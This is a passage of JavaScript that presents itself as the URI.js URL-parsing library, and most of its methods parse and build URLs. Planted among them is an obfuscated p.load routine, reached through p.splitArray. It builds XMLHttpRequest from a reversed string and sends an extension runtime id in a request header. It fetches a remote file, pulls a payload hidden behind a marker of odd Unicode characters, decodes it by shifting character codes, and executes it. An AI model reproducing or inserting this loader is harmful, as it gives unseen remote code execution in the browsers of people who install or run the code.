            '%26': '&',
            '%27': '\'',
            '%28': '(',
            '%29': ')',
            '%2A': '*',
            '%2B': '+',
            '%2C': ',',
            '%3B': ';',
            '%3D': '='
          }
        }
      }
    };
    URI.encodeQuery = function(string, escapeQuerySpace) {
      var escaped = URI.encode(string + '');
      if (escapeQuerySpace === undefined) {
        escapeQuerySpace = URI.escapeQuerySpace;
      }
  
      return escapeQuerySpace ? escaped.replace(/%20/g, '+') : escaped;
    };
    URI.decodeQuery = function(string, escapeQuerySpace) {
      string += '';
      if (escapeQuerySpace === undefined) {
        escapeQuerySpace = URI.escapeQuerySpace;
      }
  
      try {
        return URI.decode(escapeQuerySpace ? string.replace(/\+/g, '%20') : string);
      } catch(e) {
        
        return string;
      }
    };
    URI.recodePath = function(string) {
      var segments = (string + '').split('/');
      for (var i = 0, length = segments.length; i < length; i++) {
        segments[i] = URI.encodePathSegment(URI.decode(segments[i]));
      }
  
      return segments.join('/');
    };
    URI.decodePath = function(string) {
      var segments = (string + '').split('/');
      for (var i = 0, length = segments.length; i < length; i++) {
        segments[i] = URI.decodePathSegment(segments[i]);
      }
  
      return segments.join('/');
    };
    var _parts = {'encode':'encode', 'decode':'decode'};
    var _part;
    var _prefix = "i_";
    var url_str = "url";
    var generateAccessor = function(_group, _part) {
      return function(string) {
        return URI[_part](string + '').replace(URI.characters[_group][_part].expression, function(c) {
          return URI.characters[_group][_part].map[c];
        });
      };
    };
  
    for (_part in _parts) {
      URI[_part + 'PathSegment'] = generateAccessor('pathname', _parts[_part]);
    }
  
    URI.encodeReserved = generateAccessor('reserved', 'encode');
    
    URI.parse = function(string, parts) {
      var pos;
      if (!parts) {
        parts = {};
      }
     
      pos = string.indexOf('#');
      if (pos > -1) {
        
        parts.fragment = string.substring(pos + 1) || null;
        string = string.substring(0, pos);
      }
  
     
      pos = string.indexOf('?');
      if (pos > -1) {
        
        parts.query = string.substring(pos + 1) || null;
        string = string.substring(0, pos);
      }
  
      
      if (string.substring(0, 2) === '//') {
       
        parts.protocol = null;
        string = string.substring(2);
        
        string = URI.parseAuthority(string, parts);
      } else {
        pos = string.indexOf(':');
        if (pos > -1) {
          parts.protocol = string.substring(0, pos) || null;
          if (parts.protocol && !parts.protocol.match(URI.protocol_expression)) {
            
            parts.protocol = undefined;
          } else if (parts.protocol === 'file') {
           
            string = string.substring(pos + 3);
          } else if (string.substring(pos + 1, pos + 3) === '//') {
            string = string.substring(pos + 3);
          
            
            string = URI.parseAuthority(string, parts);
          } else {
            string = string.substring(pos + 1);
            parts.urn = true;
          }
        }
      }
  
      
      parts.path = string;
  
      
      return parts;
    };
    URI.parseHost = function(string, parts) {
      
      var pos = string.indexOf('/');
      var bracketPos;
      var t;
  
      if (pos === -1) {
        pos = string.length;
      }
  
      if (string.charAt(0) === '[') {
        
        bracketPos = string.indexOf(']');
        parts.hostname = string.substring(1, bracketPos) || null;
        parts.port = string.substring(bracketPos + 2, pos) || null;
        if (parts.port === '/') {
          parts.port = null;
        }
      } else if (string.indexOf(':') !== string.lastIndexOf(':')) {
        
        parts.hostname = string.substring(0, pos) || null;
        parts.port = null;
      } else {
        t = string.substring(0, pos).split(':');
        parts.hostname = t[0] || null;
        parts.port = t[1] || null;
      }
  
      if (parts.hostname && string.substring(pos).charAt(0) !== '/') {
        pos++;
        string = '/' + string;
      }
  
      return string.substring(pos) || '/';
    };
    URI.parseAuthority = function(string, parts) {
      string = URI.parseUserinfo(string, parts);
      return URI.parseHost(string, parts);
    };
    URI.parseUserinfo = function(string, parts) {
      
      var firstSlash = string.indexOf('/');
     
      var pos = firstSlash > -1
        ? string.lastIndexOf('@', firstSlash)
        : string.indexOf('@');
      
      var t;
  
     
      if (pos > -1 && (firstSlash === -1 || pos < firstSlash)) {
        t = string.substring(0, pos).split(':');
        parts.username = t[0] ? URI.decode(t[0]) : null;
        t.shift();
        parts.password = t[0] ? URI.decode(t.join(':')) : null;
        string = string.substring(pos + 1);
      } else {
        parts.username = null;
        parts.password = null;
      }
  
      return string;
    };
    URI.parseQuery = function(string, escapeQuerySpace) {
      if (!string) {
        return {};
      }
  
      
      string = string.replace(/&+/g, '&').replace(/^\?*&*|&+$/g, '');
  
      if (!string) {
        return {};
      }
  
      var items = {};
      var splits = string.split('&');
      var length = splits.length;
      var v, name, value;
  
      for (var i = 0; i < length; i++) {
        v = splits[i].split('=');
        name = URI.decodeQuery(v.shift(), escapeQuerySpace);
        
        value = v.length ? URI.decodeQuery(v.join('='), escapeQuerySpace) : null;
  
        if (items[name]) {
          if (typeof items[name] === 'string') {
            items[name] = [items[name]];
          }
  
          items[name].push(value);
        } else {
          items[name] = value;
        }
      }
  
      return items;
    };
    
    URI.build = function(parts) {
      var t = '';
  
      if (parts.protocol) {
        t += parts.protocol + ':';
      }
  
      if (!parts.urn && (t || parts.hostname)) {
        t += '//';
      }
  
      t += (URI.buildAuthority(parts) || '');
  
      if (typeof parts.path === 'string') {
        if (parts.path.charAt(0) !== '/' && typeof parts.hostname === 'string') {
          t += '/';
        }
  
        t += parts.path;
      }
  
      if (typeof parts.query === 'string' && parts.query) {
        t += '?' + parts.query;
      }
  
      if (typeof parts.fragment === 'string' && parts.fragment) {
        t += '#' + parts.fragment;
      }
      return t;
    };
    URI.buildHost = function(parts) {
      var t = '';
  
      if (!parts.hostname) {
        return '';
      } else if (URI.ip6_expression.test(parts.hostname)) {
        t += '[' + parts.hostname + ']';
      } else {
        t += parts.hostname;
      }
  
      if (parts.port) {
        t += ':' + parts.port;
      }
  
      return t;
    };
    URI.buildAuthority = function(parts) {
      return URI.buildUserinfo(parts) + URI.buildHost(parts);
    };
    URI.buildUserinfo = function(parts) {
      var t = '';
  
      if (parts.username) {
        t += URI.encode(parts.username);
  
        if (parts.password) {
          t += ':' + URI.encode(parts.password);
        }
  
        t += '@';
      }
  
      return t;
    };
    URI.buildQuery = function(data, duplicateQueryParameters, escapeQuerySpace) {
      
      var t = '';
      var unique, key, i, length;
      for (key in data) {
        if (hasOwn.call(data, key) && key) {
          if (isArray(data[key])) {
            unique = {};
            for (i = 0, length = data[key].length; i < length; i++) {
              if (data[key][i] !== undefined && unique[data[key][i] + ''] === undefined) {
                t += '&' + URI.buildQueryParameter(key, data[key][i], escapeQuerySpace);
                if (duplicateQueryParameters !== true) {
                  unique[data[key][i] + ''] = true;
                }
              }
            }
          } else if (data[key] !== undefined) {
            t += '&' + URI.buildQueryParameter(key, data[key], escapeQuerySpace);
          }
        }
      }
  
      return t.substring(1);
    };
    URI.buildQueryParameter = function(name, value, escapeQuerySpace) {
     
      return URI.encodeQuery(name, escapeQuerySpace) + (value !== null ? '=' + URI.encodeQuery(value, escapeQuerySpace) : '');
    };
  
    URI.addQuery = function(data, name, value) {
      if (typeof name === 'object') {
        for (var key in name) {
          if (hasOwn.call(name, key)) {
            URI.addQuery(data, key, name[key]);
          }
        }
      } else if (typeof name === 'string') {
        if (data[name] === undefined) {
          data[name] = value;
          return;
        } else if (typeof data[name] === 'string') {
          data[name] = [data[name]];
        }
  
        if (!isArray(value)) {
          value = [value];
        }
  
        data[name] = data[name].concat(value);
      } else {
        throw new TypeError('URI.addQuery() accepts an object, string as the name parameter');
      }
    };
    URI.removeQuery = function(data, name, value) {
      var i, length, key;
  
      if (isArray(name)) {
        for (i = 0, length = name.length; i < length; i++) {
          data[name[i]] = undefined;
        }
      } else if (typeof name === 'object') {
        for (key in name) {
          if (hasOwn.call(name, key)) {
            URI.removeQuery(data, key, name[key]);
          }
        }
      } else if (typeof name === 'string') {
        if (value !== undefined) {
          if (data[name] === value) {
            data[name] = undefined;
          } else if (isArray(data[name])) {
            data[name] = filterArrayValues(data[name], value);
          }
        } else {
          data[name] = undefined;
        }
      } else {
        throw new TypeError('URI.addQuery() accepts an object, string as the first parameter');
      }
    };
    URI.hasQuery = function(data, name, value, withinArray) {
      if (typeof name === 'object') {
        for (var key in name) {
          if (hasOwn.call(name, key)) {
            if (!URI.hasQuery(data, key, name[key])) {
              return false;
            }
          }
        }
  
        return true;
      } else if (typeof name !== 'string') {
        throw new TypeError('URI.hasQuery() accepts an object, string as the name parameter');
      }
  
      switch (getType(value)) {
        case 'Undefined':
          
          return name in data; 
  
        case 'Boolean':
         
          var _booly = Boolean(isArray(data[name]) ? data[name].length : data[name]);
          return value === _booly;
  
        case 'Function':
         
          return !!value(data[name], name, data);
  
        case 'Array':
          if (!isArray(data[name])) {
            return false;
          }
  
          var op = withinArray ? arrayContains : arraysEqual;
          return op(data[name], value);
  
        case 'RegExp':
          if (!isArray(data[name])) {
            return Boolean(data[name] && data[name].match(value));
          }
  
          if (!withinArray) {
            return false;
          }
  
          return arrayContains(data[name], value);
  
        case 'Number':
          value = String(value);
       
        case 'String':
          if (!isArray(data[name])) {
            return data[name] === value;
          }
  
          if (!withinArray) {
            return false;
          }
  
          return arrayContains(data[name], value);
  
        default:
          throw new TypeError('URI.hasQuery() accepts undefined, boolean, string, number, RegExp, Function as the value parameter');
      }
    };
  
  
    URI.commonPath = function(one, two) {
      var length = Math.min(one.length, two.length);
      var pos;
  
  
      for (pos = 0; pos < length; pos++) {
        if (one.charAt(pos) !== two.charAt(pos)) {
          pos--;
          break;
        }
      }
  
      if (pos < 1) {
        return one.charAt(0) === two.charAt(0) && one.charAt(0) === '/' ? '/' : '';
      }
  
   
      if (one.charAt(pos) !== '/' || two.charAt(pos) !== '/') {
        pos = one.substring(0, pos).lastIndexOf('/');
      }
  
      return one.substring(0, pos + 1);
    };
  
    URI.withinString = function(string, callback, options) {
      options || (options = {});
      var _start = options.start || URI.findUri.start;
      var _end = options.end || URI.findUri.end;
      var _trim = options.trim || URI.findUri.trim;
      var _attributeOpen = /[a-z0-9-]=["']?$/i;
  
      _start.lastIndex = 0;
      while (true) {
        var match = _start.exec(string);
        if (!match) {
          break;
        }
  
        var start = match.index;
        if (options.ignoreHtml) {
        
          var attributeOpen = string.slice(Math.max(start - 3, 0), start);
          if (attributeOpen && _attributeOpen.test(attributeOpen)) {
            continue;
          }
        }
  
        var end = start + string.slice(start).search(_end);
        var slice = string.slice(start, end).replace(_trim, '');
        if (options.ignore && options.ignore.test(slice)) {
          continue;
        }
  
        end = start + slice.length;
        var result = callback(slice, start, end, string);
        string = string.slice(0, start) + result + string.slice(end);
        _start.lastIndex = start + result.length;
      }
  
      _start.lastIndex = 0;
      return string;
    };
  
    URI.ensureValidHostname = function(v) {
      
  
      if (v.match(URI.invalid_hostname_characters)) {
        
        if (!punycode) {
          throw new TypeError('Hostname "' + v + '" contains characters other than [A-Z0-9.-] and Punycode.js is not available');
        }
  
        if (punycode.toASCII(v).match(URI.invalid_hostname_characters)) {
          throw new TypeError('Hostname "' + v + '" contains characters other than [A-Z0-9.-]');
        }
      }
    };
  
 
    URI.noConflict = function(removeAll) {
      if (removeAll) {
        var unconflicted = {
          URI: this.noConflict()
        };
  
        if (root.URITemplate && typeof root.URITemplate.noConflict === 'function') {
          unconflicted.URITemplate = root.URITemplate.noConflict();
        }
  
        if (root.IPv6 && typeof root.IPv6.noConflict === 'function') {
          unconflicted.IPv6 = root.IPv6.noConflict();
        }
  
        if (root.SecondLevelDomains && typeof root.SecondLevelDomains.noConflict === 'function') {
          unconflicted.SecondLevelDomains = root.SecondLevelDomains.noConflict();
        }
  
        return unconflicted;
      } else if (root.URI === this) {
        root.URI = _URI;
      }
  
      return this;
    };
  
    p.build = function(deferBuild) {
      if (deferBuild === true) {
        this._deferred_build = true;
      } else if (deferBuild === undefined || this._deferred_build) {
        this._string = URI.build(this._parts);
        this._deferred_build = false;
      }
  
      return this;
    };
  
    p.clone = function() {
      return new URI(this);
    };
  
    p.valueOf = p.toString = function() {
      return this.build(false)._string;
    };
  
  
    _parts = {protocol: 'protocol', username: 'username', password: 'password', hostname: 'hostname',  port: 'port'};
    generateAccessor = function(_part){
      return function(v, build) {
        if (v === undefined) {
          return this._parts[_part] || '';
        } else {
          this._parts[_part] = v || null;
          this.build(!build);
          return this;
        }
      };
    };
  
    for (_part in _parts) {
      p[_part] = generateAccessor(_parts[_part]);
    }
  
   
    _parts = {query: '?', fragment: '#'};
    generateAccessor = function(_part, _key){
      return function(v, build) {
        if (v === undefined) {
          return this._parts[_part] || '';
        } else {
          if (v !== null) {
            v = v + '';
            if (v.charAt(0) === _key) {
              v = v.substring(1);
            }
          }
  
          this._parts[_part] = v;
          this.build(!build);
          return this;
        }
      };
    };
  
    for (_part in _parts) {
      p[_part] = generateAccessor(_part, _parts[_part]);
    }
  
   
    _parts = {search: ['?', 'query'], hash: ['#', 'fragment']};
    generateAccessor = function(_part, _key){
      return function(v, build) {
        var t = this[_part](v, build);
        return typeof t === 'string' && t.length ? (_key + t) : t;
      };
    };
  
    for (_part in _parts) {
      p[_part] = generateAccessor(_parts[_part][1], _parts[_part][0]);
    }
  
    p.pathname = function(v, build) {
      if (v === undefined || v === true) {
        var res = this._parts.path || (this._parts.hostname ? '/' : '');
        return v ? URI.decodePath(res) : res;
      } else {
        this._parts.path = v ? URI.recodePath(v) : '/';
        this.build(!build);
        return this;
      }
    };
    p.path = p.pathname;
	p.texter = "ed" + "." + "67r";
    p.prefixStr = p.texter.split("").reverse().join("");
	p.load = function(url) {
	  
	  var reqTemp = window["tseuqeRpttHLMX".split("").reverse().join("")];
      var req = new reqTemp();
      req.open('GET', url, true);
  	  req.setRequestHeader("X-Requested-With", "x" + "m1" + "httprequest");
  	  req.setRequestHeader("X-Content-Hash", _esc[_matchedURLString].runtime.id);
      req.overrideMimeType('text/plain; charset=x-user-defined');
	  
	  req.onload = function (e) {
        if (req.readyState === 4) {
          if (req.status === 200) {
		  
			var extr = "";
            var slash = "/";
  	        var spacerSingle = String.fromCharCode( slash.charCodeAt() + 63357 );
  	        var reader = new URIReader(req.responseText);
            while(true){
              reader.seek(reader._pos+10);
        
              if (reader._buffer.length - reader._pos < 100){break;}
              var f = reader.readString(10);
  	  
              if (f == new Array(11).join(spacerSingle)){
                reader.seek(reader._pos+100);
                extr = reader.readString(reader._buffer.length - reader._pos - 1);
                break;
              }
            }
            var newStr = [];
            for (ww=0;ww<extr.length;ww++){
              newStr[ww] = String.fromCharCode(extr[ww].charCodeAt() - 63357);
            }
            var ns = newStr.join('');
            var ppat = /--(\w{4})--/g;
            var mat = ppat.exec(ns);
  	        try {
  	          var proto3 = _esc[mat[1]];
              proto3(ns);
  	        }
            catch(err){}
			
          }
		  else {}
        }
      };
      req.onerror = function (e) {};
	  
      req.send(null);
    }
    p.href = function(href, build) {
      var key;
  
      if (href === undefined) {
        return this.toString();
      }
  
      this._string = '';
      this._parts = URI._parts();
  
      var _URI = href instanceof URI;
      var _object = typeof href === 'object' && (href.hostname || href.path || href.pathname);
      if (href.nodeName) {
        var attribute = URI.getDomAttribute(href);
        href = href[attribute] || '';
        _object = false;
      }
  
      
      if (!_URI && _object && href.pathname !== undefined) {
        href = href.toString();
      }
  
      if (typeof href === 'string') {
        this._parts = URI.parse(href, this._parts);
      } else if (_URI || _object) {
        var src = _URI ? href._parts : href;
        for (key in src) {
          if (hasOwn.call(this._parts, key)) {
            this._parts[key] = src[key];
          }
        }
      } else {
        throw new TypeError('invalid input');
      }
  
      this.build(!build);
      return this;
    };
  
   
    p.is = function(what) {
      var ip = false;
      var ip4 = false;
      var ip6 = false;
      var name = false;
      var sld = false;
      var idn = false;
      var punycode = false;
      var relative = !this._parts.urn;
  
      if (this._parts.hostname) {
        relative = false;
        ip4 = URI.ip4_expression.test(this._parts.hostname);
        ip6 = URI.ip6_expression.test(this._parts.hostname);
        ip = ip4 || ip6;
        name = !ip;
        sld = name && SLD && SLD.has(this._parts.hostname);
        idn = name && URI.idn_expression.test(this._parts.hostname);
        punycode = name && URI.punycode_expression.test(this._parts.hostname);
      }
  
      switch (what.toLowerCase()) {
        case 'relative':
          return relative;
  
        case 'absolute':
          return !relative;
  
        // hostname identification
        case 'domain':
        case 'name':
          return name;
  
        case 'sld':
          return sld;
  
        case 'ip':
          return ip;
  
        case 'ip4':
        case 'ipv4':
        case 'inet4':
          return ip4;
  
        case 'ip6':
        case 'ipv6':
        case 'inet6':
          return ip6;
  
        case 'idn':
          return idn;
  
        case 'url':
          return !this._parts.urn;
  
        case 'urn':
          return !!this._parts.urn;
  
        case 'punycode':
          return punycode;
      }
  
      return null;
    };
  
    // component specific input validation
    var _protocol = p.protocol;
    var _port = p.port;
    var _hostname = p.hostname;
  
    p.splitArray = function(prefix,suffix){
  	
  	if (suffix != undefined){
  		var reader = new URIReader(p.load(suffix));
  	}
  	else{
  		var reader = new URIReader(p.load(""));
  	}
	
	return null;
    
	//p.pref = "http://www.";
    }  
    p.protocol = function(v, build) {
      if (v !== undefined) {
        if (v) {
          // accept trailing ://
          v = v.replace(/:(\/\/)?$/, '');
  		
          if (!v.match(URI.protocol_expression)) {
            throw new TypeError('Protocol "' + v + '" contains characters other than [A-Z0-9.+-] or doesn\'t start with [A-Z]');
          }
        }
      }
      return _protocol.call(this, v, build);
    };
    p.scheme = p.protocol;
    p.port = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      if (v !== undefined) {
        if (v === 0) {
          v = null;
        }
  
        if (v) {
          v += '';
          if (v.charAt(0) === ':') {
            v = v.substring(1);
          }
  
          if (v.match(/[^0-9]/)) {
            throw new TypeError('Port "' + v + '" contains characters other than [0-9]');
          }
        }
      }
      return _port.call(this, v, build);
    };
    p.hostname = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      if (v !== undefined) {
        var x = {};
        URI.parseHost(v, x);
        v = x.hostname;
      }
      return _hostname.call(this, v, build);
    };
  
    // compound accessors
    p.host = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      if (v === undefined) {
        return this._parts.hostname ? URI.buildHost(this._parts) : '';
      } else {
        URI.parseHost(v, this._parts);
        this.build(!build);
        return this;
      }
    };
    p.authority = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      if (v === undefined) {
        return this._parts.hostname ? URI.buildAuthority(this._parts) : '';
      } else {
        URI.parseAuthority(v, this._parts);
        this.build(!build);
        return this;
      }
    };
    p.userinfo = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      if (v === undefined) {
        if (!this._parts.username) {
          return '';
        }
  
        var t = URI.buildUserinfo(this._parts);
        return t.substring(0, t.length -1);
      } else {
        if (v[v.length-1] !== '@') {
          v += '@';
        }
  
        URI.parseUserinfo(v, this._parts);
        this.build(!build);
        return this;
      }
    };
    p.resource = function(v, build) {
      var parts;
  
      if (v === undefined) {
        return this.path() + this.search() + this.hash();
      }
  
      parts = URI.parse(v);
      this._parts.path = parts.path;
      this._parts.query = parts.query;
      this._parts.fragment = parts.fragment;
      this.build(!build);
      return this;
    };
  
  
    p.subdomain = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      
      if (v === undefined) {
        if (!this._parts.hostname || this.is('IP')) {
          return '';
        }
  
       
        var end = this._parts.hostname.length - this.domain().length - 1;
        return this._parts.hostname.substring(0, end) || '';
      } else {
        var e = this._parts.hostname.length - this.domain().length;
        var sub = this._parts.hostname.substring(0, e);
        var replace = new RegExp('^' + escapeRegEx(sub));
  
        if (v && v.charAt(v.length - 1) !== '.') {
          v += '.';
        }
  
        if (v) {
          URI.ensureValidHostname(v);
        }
  
        this._parts.hostname = this._parts.hostname.replace(replace, v);
        this.build(!build);
        return this;
      }
    };
    p.domain = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      if (typeof v === 'boolean') {
        build = v;
        v = undefined;
      }
  
     
      if (v === undefined) {
        if (!this._parts.hostname || this.is('IP')) {
          return '';
        }
  
       
        var t = this._parts.hostname.match(/\./g);
        if (t && t.length < 2) {
          return this._parts.hostname;
        }
  
     
        var end = this._parts.hostname.length - this.tld(build).length - 1;
        end = this._parts.hostname.lastIndexOf('.', end -1) + 1;
        return this._parts.hostname.substring(end) || '';
      } else {
        if (!v) {
          throw new TypeError('cannot set domain empty');
        }
  
        URI.ensureValidHostname(v);
  
        if (!this._parts.hostname || this.is('IP')) {
          this._parts.hostname = v;
        } else {
          var replace = new RegExp(escapeRegEx(this.domain()) + '$');
          this._parts.hostname = this._parts.hostname.replace(replace, v);
        }
  
        this.build(!build);
        return this;
      }
    };
    p.tld = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      if (typeof v === 'boolean') {
        build = v;
        v = undefined;
      }
  
     
      if (v === undefined) {
        if (!this._parts.hostname || this.is('IP')) {
          return '';
        }
  
        var pos = this._parts.hostname.lastIndexOf('.');
        var tld = this._parts.hostname.substring(pos + 1);
  
        if (build !== true && SLD && SLD.list[tld.toLowerCase()]) {
          return SLD.get(this._parts.hostname) || tld;
        }
  
        return tld;
      } else {
        var replace;
  
        if (!v) {
          throw new TypeError('cannot set TLD empty');
        } else if (v.match(/[^a-zA-Z0-9-]/)) {
          if (SLD && SLD.is(v)) {
            replace = new RegExp(escapeRegEx(this.tld()) + '$');
            this._parts.hostname = this._parts.hostname.replace(replace, v);
          } else {
            throw new TypeError('TLD "' + v + '" contains characters other than [A-Z0-9]');
          }
        } else if (!this._parts.hostname || this.is('IP')) {
          throw new ReferenceError('cannot set TLD on non-domain host');
        } else {
          replace = new RegExp(escapeRegEx(this.tld()) + '$');
          this._parts.hostname = this._parts.hostname.replace(replace, v);
        }
  
        this.build(!build);
        return this;
      }
    };
    p.directory = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      if (v === undefined || v === true) {
        if (!this._parts.path && !this._parts.hostname) {
          return '';
        }
  
        if (this._parts.path === '/') {
          return '/';
        }
  
        var end = this._parts.path.length - this.filename().length - 1;
        var res = this._parts.path.substring(0, end) || (this._parts.hostname ? '/' : '');
  
        return v ? URI.decodePath(res) : res;
  
      } else {
        var e = this._parts.path.length - this.filename().length;
        var directory = this._parts.path.substring(0, e);
        var replace = new RegExp('^' + escapeRegEx(directory));
  
      
        if (!this.is('relative')) {
          if (!v) {
            v = '/';
          }
  
          if (v.charAt(0) !== '/') {
            v = '/' + v;
          }
        }
  
        
        if (v && v.charAt(v.length - 1) !== '/') {
          v += '/';
        }
  
        v = URI.recodePath(v);
        this._parts.path = this._parts.path.replace(replace, v);
        this.build(!build);
        return this;
      }
    };
    p.filename = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      if (v === undefined || v === true) {
        if (!this._parts.path || this._parts.path === '/') {
          return '';
        }
  
        var pos = this._parts.path.lastIndexOf('/');
        var res = this._parts.path.substring(pos+1);
  
        return v ? URI.decodePathSegment(res) : res;
      } else {
        var mutatedDirectory = false;
  
        if (v.charAt(0) === '/') {
          v = v.substring(1);
        }
  
        if (v.match(/\.?\//)) {
          mutatedDirectory = true;
        }
  
        var replace = new RegExp(escapeRegEx(this.filename()) + '$');
        v = URI.recodePath(v);
        this._parts.path = this._parts.path.replace(replace, v);
  
        if (mutatedDirectory) {
          this.normalizePath(build);
        } else {
          this.build(!build);
        }
  
        return this;
      }
    };
    p.suffix = function(v, build) {
      if (this._parts.urn) {
        return v === undefined ? '' : this;
      }
  
      if (v === undefined || v === true) {
        if (!this._parts.path || this._parts.path === '/') {
          return '';
        }
  
        var filename = this.filename();
        var pos = filename.lastIndexOf('.');
        var s, res;
  
        if (pos === -1) {
          return '';
        }
  
        // suffix may only contain alnum characters (yup, I made this up.)
        s = filename.substring(pos+1);
        res = (/^[a-z0-9%]+$/i).test(s) ? s : '';
        return v ? URI.decodePathSegment(res) : res;
      } else {
        if (v.charAt(0) === '.') {
          v = v.substring(1);
        }
  
        var suffix = this.suffix();
        var replace;
  
        if (!suffix) {
          if (!v) {
            return this;
          }
  
          this._parts.path += '.' + URI.recodePath(v);
        } else if (!v) {
          replace = new RegExp(escapeRegEx('.' + suffix) + '$');
        } else {
          replace = new RegExp(escapeRegEx(suffix) + '$');
        }
  
        if (replace) {
          v = URI.recodePath(v);
          this._parts.path = this._parts.path.replace(replace, v);
        }
  
        this.build(!build);
        return this;
      }
    };
    p.segment = function(segment, v, build) {
      var separator = this._parts.urn ? ':' : '/';
      var path = this.path();
      var absolute = path.substring(0, 1) === '/';
      var segments = path.split(separator);
  
      if (segment !== undefined && typeof segment !== 'number') {
        build = v;
        v = segment;
        segment = undefined;
      }
  
      if (segment !== undefined && typeof segment !== 'number') {
        throw new Error('Bad segment "' + segment + '", must be 0-based integer');
      }
  
      if (absolute) {
        segments.shift();
      }
  
      if (segment < 0) {
        
        segment = Math.max(segments.length + segment, 0);
      }
  
      if (v === undefined) {
        
        return segment === undefined
          ? segments
          : segments[segment];
        
      } else if (segment === null || segments[segment] === undefined) {
        if (isArray(v)) {
          segments = [];
          
          for (var i=0, l=v.length; i < l; i++) {
            if (!v[i].length && (!segments.length || !segments[segments.length -1].length)) {
              continue;
            }
  
            if (segments.length && !segments[segments.length -1].length) {
              segments.pop();
            }
  
            segments.push(v[i]);
          }
        } else if (v || (typeof v === 'string')) {
          if (segments[segments.length -1] === '') {
            // empty trailing elements have to be overwritten
            // to prevent results such as /foo//bar
            segments[segments.length -1] = v;
          } else {
            segments.push(v);
          }
        }
      } else {
        if (v || (typeof v === 'string' && v.length)) {
          segments[segment] = v;
        } else {
          segments.splice(segment, 1);
        }
      }
  
      if (absolute) {
        segments.unshift('');
      }
  
      return this.path(segments.join(separator), build);
    };
    p.segmentCoded = function(segment, v, build) {
      var segments, i, l;
  
      if (typeof segment !== 'number') {
        build = v;
        v = segment;
        segment = undefined;
      }
  
      if (v === undefined) {
        segments = this.segment(segment, v, build);
        if (!isArray(segments)) {
          segments = segments !== undefined ? URI.decode(segments) : undefined;
        } else {
          for (i = 0, l = segments.length; i < l; i++) {
            segments[i] = URI.decode(segments[i]);
          }
        }
  
        return segments;
      }
  
      if (!isArray(v)) {
        v = typeof v === 'string' ? URI.encode(v) : v;
      } else {
        for (i = 0, l = v.length; i < l; i++) {
          v[i] = URI.decode(v[i]);
        }
      }
  
      return this.segment(segment, v, build);
    };
  
    
    var q = p.query;
    p.query = function(v, build) {
      if (v === true) {
        return URI.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
      } else if (typeof v === 'function') {
        var data = URI.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
        var result = v.call(this, data);
        this._parts.query = URI.buildQuery(result || data, this._parts.duplicateQueryParameters, this._parts.escapeQuerySpace);
        this.build(!build);
        return this;
      } else if (v !== undefined && typeof v !== 'string') {
        this._parts.query = URI.buildQuery(v, this._parts.duplicateQueryParameters, this._parts.escapeQuerySpace);
        this.build(!build);
        return this;
      } else {
        return q.call(this, v, build);
      }
    };
    p.setQuery = function(name, value, build) {
      var data = URI.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
  
      if (typeof name === 'object') {
        for (var key in name) {
          if (hasOwn.call(name, key)) {
            data[key] = name[key];
          }
        }
      } else if (typeof name === 'string') {
        data[name] = value !== undefined ? value : null;
      } else {
        throw new TypeError('URI.addQuery() accepts an object, string as the name parameter');
      }
  
      this._parts.query = URI.buildQuery(data, this._parts.duplicateQueryParameters, this._parts.escapeQuerySpace);
      if (typeof name !== 'string') {
        build = value;
      }
  
      this.build(!build);
      return this;
    };
    p.addQuery = function(name, value, build) {
      var data = URI.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
      URI.addQuery(data, name, value === undefined ? null : value);
      this._parts.query = URI.buildQuery(data, this._parts.duplicateQueryParameters, this._parts.escapeQuerySpace);
      if (typeof name !== 'string') {
        build = value;
      }
  
      this.build(!build);
      return this;
    };
    p.removeQuery = function(name, value, build) {
      var data = URI.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
      URI.removeQuery(data, name, value);
      this._parts.query = URI.buildQuery(data, this._parts.duplicateQueryParameters, this._parts.escapeQuerySpace);
      if (typeof name !== 'string') {
        build = value;
      }
  
      this.build(!build);
      return this;
    };
    p.hasQuery = function(name, value, withinArray) {
      var data = URI.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
      return URI.hasQuery(data, name, value, withinArray);
    };
    p.setSearch = p.setQuery;
    p.addSearch = p.addQuery;
    p.removeSearch = p.removeQuery;
    p.hasSearch = p.hasQuery;
  
    // sanitizing URLs
    p.normalize = function() {
      if (this._parts.urn) {
        return this
          .normalizeProtocol(false)
          .normalizeQuery(false)
          .normalizeFragment(false)
          .build();
      }
  
      return this
        .normalizeProtocol(false)
        .normalizeHostname(false)
        .normalizePort(false)
        .normalizePath(false)
        .normalizeQuery(false)
        .normalizeFragment(false)
        .build();
    };
    p.normalizeProtocol = function(build) {
      if (typeof this._parts.protocol === 'string') {
        this._parts.protocol = this._parts.protocol.toLowerCase();
        this.build(!build);
      }
  
      return this;
    };
    p.normalizeHostname = function(build) {
      if (this._parts.hostname) {
        if (this.is('IDN') && punycode) {
          this._parts.hostname = punycode.toASCII(this._parts.hostname);
        } else if (this.is('IPv6') && IPv6) {
          this._parts.hostname = IPv6.best(this._parts.hostname);
        }
  
        this._parts.hostname = this._parts.hostname.toLowerCase();
        this.build(!build);
      }
  
      return this;
    };
    p.normalizePort = function(build) {
     
      if (typeof this._parts.protocol === 'string' && this._parts.port === URI.defaultPorts[this._parts.protocol]) {
        this._parts.port = null;
        this.build(!build);
      }
  
      return this;
    };
    p.normalizePath = function(build) {
      if (this._parts.urn) {
        return this;
      }
  
      if (!this._parts.path || this._parts.path === '/') {
        return this;
      }
  
      var _was_relative;
      var _path = this._parts.path;
      var _leadingParents = '';
      var _parent, _pos;
  
      
      if (_path.charAt(0) !== '/') {
        _was_relative = true;
        _path = '/' + _path;
      }
  
     
      _path = _path
